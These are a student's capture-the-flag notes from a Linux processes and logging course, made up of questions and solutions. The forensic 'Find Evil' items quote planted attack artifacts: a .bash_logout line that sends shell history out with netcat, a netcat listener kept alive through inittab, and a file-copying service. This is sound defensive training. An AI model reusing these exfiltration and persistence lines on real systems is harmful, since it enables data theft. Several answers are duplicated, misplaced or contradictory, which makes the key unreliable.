######################################################################################################################################################
######################################################                                             ###################################################
######################################################          12_linux_process_validity          ###################################################
######################################################                                             ###################################################
######################################################################################################################################################

######################################################### Linux Processes 1 5 #########################################################

What is the process ID (PID) of the SysV Init daemon?

*********************************************************     SOLUTION        **********************************************************

1 

https://uace.github.io/learning/init-vs-systemd-what-is-an-init-daemon

######################################################### Linux Processes 2 10 #########################################################

How many child processes did SysV Init daemon spawn?

*********************************************************     SOLUTION        **********************************************************

######################################################### Linux Processes 1 5 #########################################################

What is the process ID (PID) of the SysV Init daemon?

*********************************************************     SOLUTION        **********************************************************


ps displays information about a selection of the active processes

Here, we know init has a PID of 1. To see child processes of this main process use:

pgrep -P $(your_process1_pid)

To grab the length

garviel@terra:~$ pgrep -P 1 | wc -l

ans -> 22

######################################################### Linux Processes 3 10 #########################################################

Identify all of the arguments given to the ntpd daemon (service) using ps.

Format: List all options with parameters (include numbers).

*********************************************************     SOLUTION        **********************************************************

Here, Elf produce the most complete information for each process

Now using ps to grep the ntpd we ger following results:

ps -elf | grep -I “ntpd”

-p /var/run/ntpd.pid -g -u 105:109

######################################################### Linux Processes 4 10 #########################################################

What is the parent process to Bombadil’s Bash process? (name of the binary, not the absolute path)

*********************************************************     SOLUTION        **********************************************************

- use command ps –efj to see all the running process

- to find the bash use: bombadil@minas-tirith:/$ ps -efj | grep "bash" ----- this will give us 3 results

Now to get the parent pocess grep the PPID (PPID is parent process to PID), PPID is 3rd column

ps -efj | grep 6441

ps -efj | grep 6441

#Note even if I grep 3006 it still gives the sshd as the parent process

######################################################### Linux Processes 1 5 #########################################################

Identify the file mapped to the fourth file descriptor (handle) of the cron process.

HINT: There might be multiple cron processes, but only one with the answer.

Flag format: /absolute/path

*********************************************************     SOLUTION        **********************************************************

sudo lsof -c cron # run these to list teh files mapped... look at the FD section which is the file descriptor 3u is the fourth file descriptor and the answer will be /run/crond.pid

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Lsof = list of open files command

Sudo Lsof –c (your process name) # in this case cron to view the list of each file opened by a particular process ID

Now, to read the files find a number starting with 0---- we count this with 1 so the 4th file is

/run/crond.pid



######################################################### Linux Processes 6 10 #########################################################

Identify the permissions that cron has on the file identified in Processes 5.

HINT: Read the man page for lsof to understand permissions.

Flag format: If more than one, list the permissions comma separated, no spaces

*********************************************************     SOLUTION        **********************************************************

Sudo lsof –c “cron” # to View the files-----when we scroll down, we can see 5 for processes

In file descriptor it has u, which stands for read and write permission

# read,write

######################################################### Linux Processes 7 10 #########################################################

Identify the names of the orphan processes on the SysV system.

NOTE: Remember, orphan processes spawn and die periodically. Try monitoring the processes list with top or htop to find them.

Flag format: in alphabetical order with all non-alphabetic characters removed: Name,Name,Name,Name

HINT: Only character names!

*********************************************************     SOLUTION        **********************************************************

htop #patiently wait for the appearing and disappearing look at the last column

BruceWayne__
11010 root       20   0  4028    68     0 S  0.0  0.0  0:00.00 ├─ Aragorn_____
11009 root       20   0  4028    68     0 S  0.0  0.0  0:00.00 ├─ Eowyn_______
11008 root       20   0  4028    68     0 S  0.0  0.0  0:00.00 ├─ Tolkien_____Main

  PID USER      PRI  NI  VIRT   RES   SHR S CPU% MEM%   TIME+  Command
11326 root       20   0  4028    72     0 S  0.0  0.0  0:00.00 ├─ BruceWayne__
11325 root       20   0  4028    72     0 S  0.0  0.0  0:00.00 ├─ Aragorn_____
11324 root       20   0  4028    72     0 S  0.0  0.0  0:00.00 ├─ Eowyn_______
11323 root       20   0  4028    72     0 S  0.0  0.0  0:00.00 ├─ Tolkien_____Main

Aragorn,BruceWayne,Eowyn,Tolkien

Look at the last column it will pop up with orphan processess

Aragorn,BruceWayne,Eowyn,Tolkien

######################################################### Linux Processes 8 10 #########################################################

Locate zombie processes on the SysV system.

Identify the zombie processes' parent process.

NOTE: Remember, zombie processes only live until the parent process kills and removes them from the system’s process table. Try monitoring the processes list with top or htop to find them.

Flag format: /absolute/path

*********************************************************     SOLUTION        **********************************************************

run htop 

look at column s for Z then pick the path.. 

  PID USER      PRI  NI  VIRT   RES   SHR S CPU% MEM%   TIME+  Command
 4389 root       20   0 37984  4300  3824 S  0.0  0.2  0:00.00 ├─ /lib/systemd/systemd-logind
 1768 root       20   0  6300  1656  1544 S  0.0  0.1  0:00.00 ├─ /bin/netcat -lp 9999
 1767 root       20   0  4028  1004   932 S  0.0  0.0  0:00.42 ├─ /sauron
12144 root       20   0  4028   648   588 S  0.0  0.0  0:00.00 │  └─ /bin/funk
12148 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │     ├─ !!!!!!!!!
12147 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │     ├─ ___James_
12146 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │     ├─ ___Rick__
12145 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │     └─ ____Im___

/bin/funk

######################################################### Linux Processes 9 10 #########################################################

Locate the strange open port on the SysV system.

Identify the command line executable and its arguments.

Flag format: /executable/path -arguments

*********************************************************     SOLUTION        **********************************************************

sudo lsof -i -P -n | grep LISTEN #this shows the listening port 9999 seems suspicious

Now reading all the processes and looking for 99999

Ps –elf #to look for running process

/bin/netcat -lp 9999

######################################################### Linux Process Proc Dir 1 10 #########################################################


Examine the process list to find the ssh process. Then, identify the symbolic link to the absolute path for its executable in the /proc directory.

The flag is the absolute path to the symbolic link, and the file it is linked to.

Flag format: /absolute/path,/absolute/path

*********************************************************     SOLUTION        **********************************************************

Ps –elf | grep ssh ##Look for ssh process using the command:

/usr/sbin/sshd ##This gives us the first absolute path

Now, to check for the second path using grep and following PID 16885 of bombadil@pts/0

Sudo ls –l /proc/1688 #this gives us the exe

exe -> /usr/sbin/sshd

/usr/sbin/sshd, /proc/1688/exe 


lrwxrwxrwx 1 root     root     0 Nov  8 18:52 exe -> /usr/sbin/sshd

/proc/6441/exe,/usr/sbin/sshd

######################################################### Linux Process Proc Dir 2 10 #########################################################

Identify the file that contains udp connection information. Identify the process using port 123.

For the flag, enter:

Process name
File descriptor number for the udp socket
Its permissions as shown in lsof
Flag format: name,#,permission

*********************************************************     SOLUTION        **********************************************************

sudo lsof -i:123 #return all services using port 123

#The problem asks for a file that contains a UDP connection, so you must look for an IP address. Only one of these results has an IP address

ntp,19,u


######################################################### Linux Processes 10 15 #########################################################

Locate the strange open port on the SysV system.

Identify how the process persists between reboots.

The flag is the absolute path for the file that contains the persistence mechanism, and the configuration option.

HINT: Persistence is defined here

Flag format: filepath,configuration_option

*********************************************************     SOLUTION        **********************************************************

htop #will show you that port 9999 is the strange open port, so netcat is the persistence mechanism

cd /etc #to change the directory to etc and to search for netcat

ls # see where 9999 is at 

cat innitab # where 9999 is... look at the path 

/etc/inittab,91:2345:respawn:/bin/netcat -lp 9999 # concatenate the path to get to innitab and 9999

######################################################### Linux Process Proc Dir 3 15 #########################################################

Identify one of the human-readable file handles by the other program that creates a zombie process.

NOTE: Remember, zombie processes only live until the parent process kills them. Try monitoring the processes list with top or htop to find them.

The flag is the text from one of the files it reads.

*********************************************************     SOLUTION        **********************************************************

14402 root       20   0  4028   628   564 S  0.0  0.0  0:00.00 │  └─ /usr/local/bin/thenine
14403 root       20   0  4160    72     0 S  0.0  0.0  0:00.00 │     └─ ________Nazgul________
14404 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │        └─ thenine

sudo lsof -c thenine # lsof to see what thenine is

cat /opt/mysoul # /opt/mysoul is the only unique one... cat so see what's inside

######################################################### Linux Process Find Evil 1 15 #########################################################

Scenario: The Villains group has been chanting offerings to their new leader at regular intervals over a TCP connection.

Task: Identify their method of communication and how it is occurring. Locate the following artifacts: ** The chant/text used by each villain (include spaces) ** The new Lord receiving the offering ** The IP address and port that the offering is received over

Flag format: chant text,new Lord,IP:port

Machine: Minas_Tirith

*********************************************************     SOLUTION        **********************************************************

htop # run this 

 4389 root       20   0 37984  4300  3824 S  0.0  0.2  0:00.00 ├─ /lib/systemd/systemd-logind
 1768 root       20   0  6300  1656  1544 S  0.0  0.1  0:00.00 ├─ /bin/netcat -lp 9999
 1767 root       20   0  4028  1004   932 S  0.0  0.0  0:00.43 ├─ /sauron
14914 root       20   0  4028   628   568 S  0.0  0.0  0:00.00 │  └─ /usr/local/bin/thenine
14915 root       20   0  4160    68     0 S  0.0  0.0  0:00.00 │     └─ ________Nazgul________
14916 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │        └─ thenine
 1766 root       20   0  4440   776   716 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty6
 1765 root       20   0  4440   672   612 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty5
 1764 root       20   0  4440   688   628 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty4
 1763 root       20   0  4440   732   668 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty3
 1762 root       20   0  4440   672   612 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty2
 1761 root       20   0  4440   668   608 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty1
 1708 root       20   0 63664  3872  3136 S  0.0  0.2  0:00.00 ├─ /usr/sbin/sshd
 6420 root       20   0 95216  6864  5904 S  0.0  0.3  0:00.02 │  └─ sshd: bombadil [priv]
 6441 bombadil   20   0 95216  3496  2536 S  0.0  0.2  0:00.70 │     └─ sshd: bombadil@pts/0
 6444 bombadil   20   0 12564  4900  3172 S  0.0  0.2  0:00.28 │        └─ -bash
14907 bombadil   20   0 15020  3580  2676 R  0.0  0.2  0:00.18 │           └─ htop
 1467 messagebu  20   0 36680  3032  2624 S  0.0  0.1  0:00.00 ├─ /usr/bin/dbus-daemon --system
 1437 ntp        20   0 95796  3056  2568 S  0.0  0.1  0:12.13 ├─ /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:109
 1463 ntp        20   0 95796  3056  2568 S  0.0  0.1  0:00.00 │  └─ /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:109
 1406 root       20   0 35800   364     0 S  0.0  0.0  0:05.58 ├─ /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid
 1329 root       20   0 21160  1876  1648 S  0.0  0.1  0:03.00 ├─ /usr/sbin/cron
14923 root       20   0 48760  2764  2360 S  0.0  0.1  0:00.00 │  └─ /usr/sbin/CRON
14942 witch_kin  20   0  4276   748   680 S  0.0  0.0  0:00.00 │     └─ /bin/sh -c /home/witch_king/camlindon > /dev/null 2
14962 witch_kin  20   0 11128  2728  2536 S  0.0  0.1  0:00.00 │        └─ /bin/bash /home/witch_king/camlindon
14976 witch_kin  20   0 11128  2524  2268 S  0.0  0.1  0:00.00 │           └─ /bin/bash /home/witch_king/camlindon
15128 witch_kin  20   0  6300  1696  1584 S  0.0  0.1  0:00.00 │              └─ nc -lw10 127.0.0.1 -p 1234


htop # monitor for Goblin_king

Mausan ukoul for avhe mubullat goth,witch_king,127.0.0.1:1234

######################################################### Linux Process Find Evil 2 15 #########################################################

Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.

Task: Identify the command being ran and how it occurs.

Flag format: command,how it occurs

Machine: Terra

Hint: Explore persistence mechanisms and services.

*********************************************************     SOLUTION        **********************************************************

find /home -name \*.txt -exec cp {} /tmp \;,vestrisecreta.service

######################################################### Linux Process Find Evil 3 15 #########################################################

Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts.

The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes.

Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.

Flag format: command,persistence

Machine: Terra


*********************************************************     SOLUTION        **********************************************************

find / -type f -size +100000 2>/dev/null # find the file occupying the most size 
ps aux # views running processes... the one below stands out

root      1006  0.0  0.0  21776   588 ?        Ss   Nov06   0:00 /bin/bash -c /bin/apache3 -lp 443 <

############

Non-Standard Apache Command:
The command /bin/apache3 -lp 443 is not a standard Apache HTTP Server command. Apache typically runs as httpd or apache2, not apache3.

Running as Root:
Apache and other web servers typically do not run as the root user for security reasons. Seeing Apache running as root is a red flag.

Listening on Port 443:
While it's normal for web servers to listen on port 443 (HTTPS), the way it's specified in the command (-lp 443) is non-standard.

Use of Bash:
The use of /bin/bash -c to run this command is unusual for a standard Apache service, which typically starts via a service manager like systemd, not directly from a bash command.

Command Injection or Unauthorized Command Execution: An attacker may have gained access to the server and executed a non-standard command, potentially masquerading as an Apache process.
Malware or Rootkit: The unusual command might be a part of a malicious script or a rootkit running on the server.


Command Injection, Malware or Rootkit # Method #DDOS
/bin/bash -c /bin/apache3 -lp 443     # Command


<<<Answer>>>
DDOS # Method
/bin/apache3 -lp 443 < /dev/urandom # command 

##########

######################################################### Linux Process Find Evil 5 15 #########################################################

Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts can’t find any persistent connections, but notice a spike in traffic on logon and logoff.

Task: Identify how the command history is stolen from the machine.

The flag is the file used to execute the commands, and where they are sent.

Flag format: /absolute/path/to/file,IP:port

Machine: Terra

*********************************************************     SOLUTION        **********************************************************

# There is a spice in logon and logoff so we should inspect Look in the scripts (.bashrc, .bash_profile or .profile, .bash_logout, etc.) for lines that involve network commands like curl, wget, nc (netcat), or other custom scripts.
cat .bashrc # should be run from the home directory cd ~ . This shows no content of malicious behavior
cat .profile # Reveals suspect commands below 
export HEAD=$(cat /dev/urandom | tr -dc a-f0-9 | head -c 32)
export HEAD2=$(cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)

grep -r "HEAD" ~/ # try to find out what are the contents for the variables HEAD. The output for HEAD is as below

Binary file /home/garviel/Win_Bootkit.vdi matches
/home/garviel/.bash_logout:history -w /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
/home/garviel/.bash_logout:nc -w2 12.54.37.8 12000 < /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
/home/garviel/.profile:export HEAD=$(cat /dev/urandom | tr -dc a-f0-9 | head -c 32)
/home/garviel/.profile:export HEAD2=$(cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)
/home/garviel/outputkirwa001.txt:HEAD
/home/garviel/sorted_output.txt:HEAD

From the fourth file we can tell that the file path is /home/garviel/.bash_logout and this is a nc (netcat) command being sent to ip address 12.54.37.8 port 12000
Answer -> netcat -lp 3389 < /tmp/NMAP_all_hosts.txt,whatischaos.timer

systemctl list-timers # See all the timers that are currently running. Systemd timers can also be used for scheduling tasks. See what tasks are scheduled
# From running this, whatischaos.timer appears to fit the 15 minutes window and the 60-seconds interval 

systemctl status whatischaos.timer # Let's check the location of whatischaos timer. It's located at /lib/systemd/system/whatischaos.timer

cat /lib/systemd/system/whatischaos.timer # Lets find out what commands could be present in the whatischaos.timer file. ExecStart=. This line will specify the command that the timer is executing periodically.This file is missing ExecStart line. We therefore hunt for the service file 

# The service file is located in the same location as the .timer file but ends with .service instead so, /lib/systemd/system/whatischaos.service

cat /lib/systemd/system/whatischaos.service # This shows the contents of the .service file as below 

[Unit]
Description=Run a service

[Service]
Type=exec
ExecStart=/bin/bash -c 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt'
Restart=no
RuntimeMaxSec=60s


From this file, we can tell that the command would be /bin/bash -c 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt' therefore the answer will be 

netcat -lp 3389 < /tmp/NMAP_all_hosts.txt,whatischaos.timer

netcat -lp 3389 < /tmp/NMAP_all_hosts.txt -> command
whatischaos.timer -> persistence


######################################################### Linux Process Find Evil 4 15 #########################################################

Scenario: The web server has been modified by an unknown hacktivist group. Users accessing the web server are reporting crashes and insane disk usage.

Task: Identify the Cyber Attack Method used by the group, and the command running.

Flag format: method,command

Machine: Terra

Try not to break your machine on this one...

*********************************************************     SOLUTION        **********************************************************

find / -type f -size +100000 2>/dev/null

ps aux

root      1006  0.0  0.0  21776   588 ?        Ss   Nov06   0:00 /bin/bash -c /bin/apache3 -lp 443 

######################################################### Linux Processes 1 5 #########################################################

What is the process ID (PID) of the SysV Init daemon?

*********************************************************     SOLUTION        **********************************************************

######################################################### Linux Processes 1 5 #########################################################

What is the process ID (PID) of the SysV Init daemon?

*********************************************************     SOLUTION        **********************************************************

grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum


grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum

grep -E 'addr=|state="filtered"' /home/garviel/output.xml | \
awk '/addr=/ {ip=$0; next} /state="filtered"/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum

grep -E 'addr=|state=' /home/garviel/output.xml | \
grep -v 'state="closed"' | \
awk '/addr=/ {ip=$0; next} /state=/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum





awk '/<host>/ {rec=""; ip=""; f=0} /<host>/,/<\/host>/ {rec = rec $0 ORS} /<state state="open"/ {f=1} /<\/host>/ {if (f) print rec}' /home/garviel/output.xml | \
grep -oP 'addr="\K[^"]*' | \
tr -d '\n' | \
md5sum



awk '
BEGIN { RS="</host>"; FS="\n"; OFS="" }
/state="open"/ {
  for (i=1; i<=NF; i++) {
    if ($i ~ /<address addr=/) {
      gsub(/.*addr="|".*/, "", $i);
      printf $i
    }
  }
}
' /home/garviel/output.xml | md5sum



######################################################################################################################################################
######################################################                                             ###################################################
######################################################        14_linux_auditing_and_logging        ###################################################
######################################################                                             ###################################################
######################################################################################################################################################


######################################################### Linux Auditing and Logging XML 1 5 #########################################################

File: /home/garviel/output.xml

Identify the XML element name in the output below

<scaninfo type="syn" protocol="tcp" numservices="200" services="1-200"/>

Flag: The element, with start and end tags


*********************************************************     SOLUTION        **********************************************************

<scaninfo>

######################################################### Linux Auditing and Logging XML 2 5 #########################################################

Identify one of the XML attributes in the output below

<scaninfo type="syn" protocol="tcp" numservices="200" services="1-200"/>

Flag format: value="pair"

*********************************************************     SOLUTION        **********************************************************

numservices="200"

######################################################### Linux Auditing and Logging Standards 1 5 #########################################################

What RFC is Syslog?

*********************************************************     SOLUTION        **********************************************************

RFC 5424 

######################################################### Linux Auditing and Logging Standards 2 5 #########################################################

Challenge only allows 3 attempts

What is the numerical code assigned to the facility dealing with authorization?

*********************************************************     SOLUTION        **********************************************************

4

######################################################### Linux Auditing and Logging Standards 3 5 #########################################################

Challenge only allows 3 attempts

How many severity codes are defined in the standard that defines syslog?

*********************************************************     SOLUTION        **********************************************************

8

######################################################### Linux Auditing and Logging Standards 4 5 #########################################################

Challenge only allows 3 attempts

What severity is assigned to system instability messages?

Hint: Use the numerical code!

*********************************************************     SOLUTION        **********************************************************

0

######################################################### Linux Auditing and Logging Syslog 1 5 #########################################################

Challenge only allows 3 attempts

Download the attached rsyslog configuration file for the Syslog # challenges.

In the legacy rules section of the file, what facility is logged to 0.log?

*********************************************************     SOLUTION        **********************************************************

0

######################################################### Linux Auditing and Logging Syslog 2 5 #########################################################

Challenge only allows 3 attempts

In the legacy rules section of the file, how many severities are logged to 0.log?

Flag: Total number of severities

*********************************************************     SOLUTION        **********************************************************

8 severities as it includes all 

######################################################### Linux Auditing and Logging Syslog 3 5 #########################################################

In the legacy rules section of the file, how many severities are logged to 4min.log?

List the severities from highest severity (lowest numerical listed) to lowest severity (highest numerical listed) using their severity name.

Flag format: name,name,name

*********************************************************     SOLUTION        **********************************************************

emergency,alert,critical,error,warning

######################################################### Linux Auditing and Logging Syslog 4 5 #########################################################

In the legacy rules section of the file, how many severities are logged to 4sig.log?

List the severities from highest severity (lowest numerical listed) to lowest severity (highest numerical listed), using their severity name.

Flag format: name,name,name

Hint: I’m sure they made a man page for this. Read the downloaded file for some links.

*********************************************************     SOLUTION        **********************************************************

! implies that its greater than and not inclusive of the number provided.

Notice,Informational,Debug

######################################################### Linux Auditing and Logging Syslog 5 5 #########################################################

Challenge only allows 3 attempts

What is being logged in not.log?

Provide the facilities from lowest facility to highest facility numerically, and the severity being logged. (List only the first word for each.)

Flag format: facility,facility,facility,severity

*********************************************************     SOLUTION        **********************************************************

https://success.trendmicro.com/dcx/s/solution/TP000086250?language=en_US

mail,clock,NTP,notice

######################################################### Linux Auditing and Logging Syslog 6 5 #########################################################

Challenge only allows 3 attempts

What facilities and what severities are being sent to a remote server over a reliable connection using port 514?

Provide the facility names, number of severities, and the correct destination IP address.

Flag format: F,F,#,IP

*********************************************************     SOLUTION        **********************************************************

@@ -> indicates tcp connections which is a reliable connection! 

Auth,authpriv,8,10.30.0.1 

######################################################### Linux Auditing and Logging Syslog 7 5 #########################################################

Challenge only allows ONE attempt

Use the answer from Syslog 6 for this question.

Do logs that match this filter ever get saved on the local machine?

*********************************************************     SOLUTION        **********************************************************

auth,authpriv.*		-/var/log/auth.log
*.*;auth,authpriv.none		-/var/log/syslog
auth,authpriv.*                @@10.30.0.1:514

authpriv is given the value 10.30.0.1:514 and assigned tcp then sent out on auth,authpriv.*		-/var/log/auth.log ---> this implies it is getting saved. 
The answer is thus yes.


######################################################### Linux Auditing and Logging Syslog 8 5 #########################################################


What messages are being sent to 10.84.0.1?

Provide the facility number, the number (amount) of severity codes, and Layer 4 connection type as the answer.

Flag format: F,S,Layer 4 connection Type


*********************************************************     SOLUTION        **********************************************************

kern,7,udp

######################################################### Linux Auditing and Logging Standards 1 5 #########################################################

File: /home/garviel/output.xml

Parse all of the IP addresses from the file using XPATH queries

https://www.w3schools.com/xml/xpath_intro.asp

HINT:
http://xpather.com/
http://www.whitebeam.org/library/guide/TechNotes/xpathtestbed.rhtm

Sample Output (without piping to MD5SUM)



 addr="XXX.xxx.xxx.xxx"
 addr="XXX.xxx.xxx.xxx"
 addr="XXX.xxx.xxx.xxx"
 addr="XXX.xxx.xxx.xxx"
 addr="XXX.xxx.xxx.xxx"
 addr="XXX.xxx.xxx.xxx"

--TRIMMED--


Flag format: md5 hash of output


*********************************************************     SOLUTION        **********************************************************

Parse all of the IP addresses from the file using XPATH queries

To parse the IP address use the following command:

xpath -q -e '//element/@attribute' file.xml

In our case: xpath -q -e '//address/@addr' output.xml

To get the md5 hash

xpath -q -e '//address/@addr' output.xml | md5sum

Ans: 0e850f14fc192c5105955ec094287bd2 

######################################################### Linux Auditing and Logging XML 4 10 #########################################################

File: /home/garviel/output.xml

Select all of the IP addresses and ports using a single XPATH Union Statement

Pipe the result to md5sum for the flag

HINT:

https://librarycarpentry.org/lc-webscraping/02-xpath/index.html
http://www.tizag.com/xmlTutorial/xpathbar.php
Sample Output (without piping to MD5SUM)



 addr="xx.xxx.xx.xx"
 addr="xx.xxx.xx.xx"
 addr="xx.xxx.xx.xx"
 addr="xx.xxx.xx.xx"
 portid="xx"
 addr="10.50.29.6"
 addr="xx.xxx.xx.xx"
 portid="22"

--TRIMMED--

*********************************************************     SOLUTION        **********************************************************

To combine two information we use “|”

xpath -q -e '//address/@addr | //port/@portid' output.xml

Now, to get the hash: xpath -q -e '//address/@addr | //port/@portid' output.xml | md5sum

ff7990139b6d09aa65afb6e069db0dec http://www.tizag.com/xmlTutorial/xpathbar.php

######################################################### Linux Auditing and Logging JSON 1 10 #########################################################

File: /home/garviel/conn.log

Use jq to pretty print the JSON file conn.log.

Hash the pretty-printed file with md5sum for the flag.

Sample JSON "Pretty Print" Output (without piping to MD5SUM)


  "ts": 1615383120.585641,
  "uid": "C9ybUDHykHdrh0h93",
  "id.orig_h": "10.50.24.73",
  "id.orig_p": 38156,
  "id.resp_h": "192.168.65.20",
  "id.resp_p": 443,
  "proto": "tcp",
  "duration": 2.8133392333984375e-05,
  "orig_bytes": 0,
  "resp_bytes": 0,

HINT:

https://jqplay.org/

https://docs.jsonata.org/simple

https://stedolan.github.io/jq/manual/



*********************************************************     SOLUTION        **********************************************************

To read the jason file:

jq . File.json, In our case: jq . conn.log

To get md5 jq . conn.log | md5sum

25ebedf7442e470eaaa48b5f7d5b96f4

######################################################### Linux Auditing and Logging JSON 2 10 #########################################################

File : /home/garviel/conn.log

This file is a conn.log made in Zeek (Bro) with data about TCP/IP connections.

Use jq to locate and count the unique originating endpoint IP addresses in the file. Enter the number of unique originating IP addresses as the flag.

Flag format: #

HINT: Use this link to understand the JSON object’s attributes


*********************************************************     SOLUTION        **********************************************************

d.orig_h addr Originating endpoint’s IP address

Here, in JSON file anything after . Is being read. So, for this example we have:

jq '."id.orig_h"' conn.log = This reads just the id.orig_h from thefile

Now to sort the file for unique IP address:

jq '."id.orig_h"' conn.log | sort | uniq | wc -l

31

######################################################### Linux Auditing and Logging JSON 3 10 #########################################################

File: /home/garviel/conn.log

This file is a conn.log made in Zeek (Bro) with data about TCP/IP connections.

Use jq to locate and count connections where the destination IP sent more than 40 bytes to the source IP.

Flag format: #



*********************************************************     SOLUTION        **********************************************************

Destination IP = id.resp_h addr Responding endpoint’s IP address (AKA RESP)

Destination ip bytes, the element we are looking for is resp_ip_bytes.

To get the output of thr response bytes: jq '."resp_ip_bytes" ' conn.log

- this gives us all the bytes. But we just need over 40. So we use awk command

jq '."resp_ip_bytes" ' conn.log | awk '$1 > 40' --- this gives us bytes over 40

Here $1 = we are only looking for column 1,

To count the output:

garviel@terra:~$ jq '."resp_ip_bytes" ' conn.log | awk '$1 > 40' | wc -l

177 https://www.geeksforgeeks.org/awk-command-unixlinux-examples/ 

######################################################### Linux Auditing and Logging Standards 1 5 #########################################################

Challenge only allows ONE attempt

Which cron log severity code is saved only to the local machine?

Flag format: #

(Continue to reference your 50-cctc.conf file from Syslog1)


*********************************************************     SOLUTION        **********************************************************

cron.!=7                       @10.66.0.1:514
cron.=7                        -/var/log/crondbg.log

Answer will be 7

######################################################### Linux Auditing and Logging Syslog 10 10 #########################################################

Challenge only allows 3 attempts

The emergency messages (only) on the system are sent to what IP Address?

(Continue to reference your 50-cctc.conf file from Syslog1)


*********************************************************     SOLUTION        **********************************************************

*.=emerg			action(type="omfwd" Target="10.24.0.1" Port="20514" Protocol="tcp" Device="eth0")

10.24.0.1

######################################################### Linux Auditing and Logging Whut 1 10 #########################################################

Use the log file attached to this for all Whut questions.

How many unique users logged into this machine?

*********************************************************     SOLUTION        **********************************************************

control f and count the number of 'user' in the txt file. 

######################################################### Linux Auditing and Logging Whut 2 10 #########################################################

What is the total amount of time users were logged into the machine?

Flag format: #h,#m (Replace the # with a number)

*********************************************************     SOLUTION        **********************************************************

Frodo ->  Apr 6 00:00:03 (start time )
Disconnected -> Apr 6 01:15:02

1 hours	12 minutes	

Balrog -> Apr 6 09:35:50
Disconnected -> Apr 6 10:26:41

51 minutes

Saruman -> Apr 6 13:34:17

Disconnected -> Apr 6 13:53:21

19 minutes

Saruman -> Apr 6 13:58:20

Disconnected -> Apr 6 16:43:21

2 hours 45 minues



totals to 5 hours, 10 minutes,,, 5h,10m

######################################################### Linux Auditing and Logging Whut 3 10 #########################################################

Identify the Cyber Attack Technique that Balrog is trying on the machine.

HINT: https://attack.mitre.org/

*********************************************************     SOLUTION        **********************************************************


Apr 6 10:11:40 linux-opstation-7qhp sudo: pam_unix(sudo:auth): auth could not identify password for [Balrog]
Apr 6 10:11:41 linux-opstation-7qhp sudo: Balrog : command not allowed ; TTY=pts/0 ; PWD=/home/Balrog ; USER=root ; COMMAND=apt install john -y

Credential Access


######################################################### Linux Auditing and Logging XML 5 15 #########################################################


File: /home/garviel/output.xml

Select every IP address with open (in use) ports using XPATH queries and XPATH axes.

Pipe the result to md5sum for the flag

Sample Output (without piping to MD5SUM)

 addr="10.50.29.5"
 portid="xx"
 addr="xx.xx.xx.xx"
 portid="xx"

--TRIMMED--

*********************************************************     SOLUTION        **********************************************************

xpath -q -e '//host[ports/port/state/@state]/address/@addr |  //host/ports/port/@portid' output.xml | md5sum


(((((((((((((((((((((((((((( ********** GIBERISH *******))))))))))))))))))))))))))))

grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum


xpath -q -e //host[ports/port/state/@state='open']/address/@addr output.xml

xpath -q -e //host/ports/port/@portid output.xml

<port protocol="tcp" portid="22"><state state="open" reason="syn-ack" reason_ttl="126"/><service name="ssh" method="table" conf="3"/></port>





<host starttime="1615316703" endtime="1615317103"><status state="up" reason="user-set" reason_ttl="0"/>
    <address addr="10.50.29.7" addrtype="ipv4"/>

    <hostnames>
    </hostnames>

    <ports>
        <extraports state="closed" count="199">
            <extrareasons reason="resets" count="199"/>
        </extraports>


        <port protocol="tcp" portid="22">
            <state state="open" reason="syn-ack" reason_ttl="62"/>
            <service name="ssh" method="table" conf="3"/>
        </port>


    </ports>
    <times srtt="2096" rttvar="237" to="50000"/>

</host>

xmllint --xpath "//host[ports/port/state/@state='open']/address/@addr" your_xml_file.xml | sed 's/addr="//g' | sed 's/"//g' > output.txt

grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum

grep -E 'addr=|state="filtered"' /home/garviel/output.xml | \
awk '/addr=/ {ip=$0; next} /state="filtered"/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum

grep -E 'addr=|state=' /home/garviel/output.xml | \
grep -v 'state="closed"' | \
awk '/addr=/ {ip=$0; next} /state=/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum





